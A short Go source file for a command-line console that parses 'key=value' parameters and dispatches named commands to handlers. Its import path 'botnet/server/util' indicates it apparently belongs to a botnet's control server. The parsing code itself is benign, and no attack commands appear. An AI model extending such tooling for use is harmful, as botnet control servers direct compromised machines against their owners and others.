package repl

import (
	. "botnet/server/util"
	"reflect"
	"regexp"
	. "strconv"
	"strings"
)

func ParseParameters(input string) map[string]interface{} {
	pattern := `(\w+)\s*=\s*("([^"]+)"|(\d+))`
	regex := regexp.MustCompile(pattern)
	matches := regex.FindAllStringSubmatch(input, -1)

	parameters := make(map[string]interface{})

	for _, match := range matches {
		if len(match) == 5 {
			key := match[1]
			if stringValue := match[3]; stringValue != "" {
				parameters[key] = stringValue
			} else if intValue, err := Atoi(match[4]); err == nil {
				parameters[key] = intValue
			}
		}
	}

	return parameters
}

func ParseCommand(input string) {
	for _, command := range Commands {
		if strings.HasPrefix(input, command.Name) {
			parameters := ParseParameters(input)
			for paramName, paramType := range command.Parameters {
				paramValue, exists := parameters[paramName]

				if !exists {
					if !strings.HasSuffix(paramType, "?") {
						Error("Failed to parse command: missing required parameter '%s'", paramName)
					}

					continue
				}

				if strings.HasPrefix(paramType, "number") && reflect.TypeOf(paramValue).Kind() != reflect.Int {
					Error("Failed to parse command: number not received for parameter '%s'", paramName)
					return
				}
			}

			command.Handler(parameters)
		}
	}
}